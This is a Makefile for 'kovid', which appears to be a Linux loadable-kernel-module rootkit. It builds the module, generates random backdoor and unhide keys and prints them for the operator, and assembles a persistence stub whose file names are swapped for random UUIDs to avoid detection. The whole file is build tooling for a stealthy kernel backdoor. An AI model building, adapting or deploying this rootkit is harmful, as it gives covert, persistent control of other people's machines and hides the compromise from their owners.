OBJNAME=kovid

# turn off ring buffer debug:
# $ DEPLOY=1 make
ifndef DEPLOY
DEBUG_PR := -DDEBUG_RING_BUFFER
endif
STRIP=$(shell which strip)
LD=$(shell which ld)
AS=$(shell which as)
CTAGS=$(shell which ctags)
JOURNALCTL := $(shell which journalctl)
UUIDGEN := $(shell uuidgen)
BDKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
UNHIDEKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')

# PROCNAME, /proc/<name> interface.
COMPILER_OPTIONS := -Wall -DPROCNAME='"$(PROCNAME)"' \
	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK -DPRCTIMEOUT=1200 \
	-DPROCNAME_MAXLEN=256 -DCPUHACK -DPRCTIMEOUT=1200 \
	-DUUIDGEN=\"$(UUIDGEN)\" -DJOURNALCTL=\"$(JOURNALCTL)\"

EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}

SRC := src/${OBJNAME}.c src/pid.c src/fs.c src/sys.c \
	src/sock.c src/util.c src/vm.c src/crypto.c

persist=src/persist

$(OBJNAME)-objs = $(SRC:.c=.o)

obj-m := ${OBJNAME}.o

CC=gcc

all: persist
	# TODO: Check if we can generate a random PROCNAME, something like:
	# PROCNAME ?= $(shell uuidgen | cut -c1-8)
	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
	sed -i 's/^static uint64_t auto_bdkey = .*/static uint64_t auto_bdkey = $(BDKEY);/' src/auto.h
	sed -i 's/^static uint64_t auto_unhidekey = .*/static uint64_t auto_unhidekey = $(UNHIDEKEY);/' src/auto.h
	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	@echo -n "Save this Backdoor KEY: "
	@echo $(BDKEY) | sed 's/^0x//'
	@echo -n "Save this LKM unhide KEY: "
	@echo $(UNHIDEKEY) | sed 's/^0x//'
	@echo PROCNAME=$(PROCNAME)

persist:
	sed -i "s|.lm.sh|${UUIDGEN}.sh|g" $(persist).S
	sed -i "s|.kv.ko|${UUIDGEN}.ko|g" $(persist).S
	$(AS) --64 $(persist).S -statistics -fatal-warnings \
		-size-check=error -o $(persist).o
	$(LD) -Ttext 200000 --oformat binary -o $(persist) $(persist).o

lgtm: persist
	make  -C  /lib/modules/$(shell dpkg --status linux-headers-generic |grep ^Depends| \
		cut -d ":" -f2| sed 's/ linux-headers-//g')/build M=$(PWD) modules

strip:
	$(STRIP) -v -g $(OBJNAME).ko

clean:
	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	@rm -f *.o src/*.o $(persist)
	@git checkout a6333fdc9e9d647b7d64e9e9cb1e6c0237a8967f \
		-- src/persist.S 2>/dev/null || true
	@git checkout a9d711472292ad23c284f701fc8848f2947cc224 \
		-- src/auto.h 2>/dev/null || true
	@echo "Clean."

tags:
	$(CTAGS) -RV src/.

.PHONY: all clean tags
